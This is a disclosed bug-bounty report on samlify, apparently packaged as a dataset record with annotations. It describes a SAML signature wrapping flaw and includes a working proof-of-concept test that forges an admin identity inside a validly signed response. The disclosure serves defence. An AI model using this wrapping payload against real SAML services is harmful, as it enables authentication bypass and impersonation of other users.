{
  "reported_to": "Node.js third-party modules",
  "reported_by": "webtonull ",
  "title": "Samlify is vulnerable to signature wrapping",
  "content": "\nI would like to report a signature wrapping weakness in samlify\nIt allows an attacker to modify a SAML token received from the IdP before validating it with the service provider\nModule\nmodule name: samlify\nversion: 2.3.7\nnpm page: https://www.npmjs.com/package/samlify\nModule Description\nHighly configuarable Node.js SAML 2.0 library for Single Sign On\nModule Stats\nReplace stats below with numbers from npm\u2019s module page:\n1084 downloads in the last week\nVulnerability\nVulnerability Description\nIt's possible to wrap the signature of a SAML response, and insert a new username in the original token, thus make it appear as though a different user was authenticated.\nSteps To Reproduce:\nClone the github repo, put this in test/flow.ts and run npm run test:\nCode 1.62 KiB\n1\n2test('should reject signature wrapped response', async t => {\n3  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)\n4  const user = { email: 'user@esaml2.com' };\n5  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));\n6  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)\n7\n8  //Decode\n9  var buffer = new Buffer(SAMLResponse, \"base64\");\n10  var xml = buffer.toString();\n11  //Create version of response without signature\n12  var stripped = xml\n13    .replace(/<ds:Signature[\\s\\S]*ds:Signature>/, \"\");\n14  //Create version of response with altered IDs and new username\n15  var outer = xml\n16    .replace(/assertion\" ID=\"_[0-9a-f]{3}/g, 'assertion\" ID=\"_000')\n17    .replace(\"user@esaml2.com\", \"admin@esaml2.com\");\n18  //Put stripped version under SubjectConfirmationData of modified version\n19  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\\/>/, \"<saml:SubjectConfirmationData>\" + stripped.replace('<?xml version=\"1.0\" encoding=\"UTF-8\"?>', \"\") + \"</saml:SubjectConfirmationData>\");\n20  const wrappedResponse = new Buffer(xmlWrapped).toString(\"base64\");\n21\n22  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });\n23  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));\n24  //This tampering goes undetected....and only fails because there are now two names\n25  t.is(extract.nameid, 'user@esaml2.com');\n26});\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nUbuntu 16.04\nv7.4.0\n6.0.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nI will try to contact the maintainer. I did not want to open an issue as that would make it obvious what the problem was.\nImpact\nAuthentication bypass\n\n",
  "severity": [
    8.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cryptographic Issues - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1540295640,
  "report_url": "https://hackerone.com/reports/356284",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Clone the GitHub repository and set up the test environment."
    ],
    [
      2,
      "Modify the SAML response by stripping the signature, altering the IDs, and inserting a new username."
    ],
    [
      3,
      "Wrap the modified response within the original SAML structure and encode it back to base64."
    ],
    [
      4,
      "Send the tampered SAML response to the service provider for validation."
    ],
    [
      5,
      "Observe that the service provider accepts the tampered response, allowing authentication bypass."
    ]
  ],
  "vuln_description": "The vulnerability is a signature wrapping attack in the samlify library, which allows an attacker to modify a SAML token received from the Identity Provider (IdP) before it is validated by the service provider. By manipulating the SAML response, an attacker can change the authenticated user's identity, leading to an authentication bypass.",
  "reason": "The attack involves understanding SAML token structure, signature validation mechanisms, and the specific way samlify processes these tokens. The attacker must carefully manipulate the XML structure to maintain validity while altering critical fields, which requires precise execution and knowledge of SAML internals.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}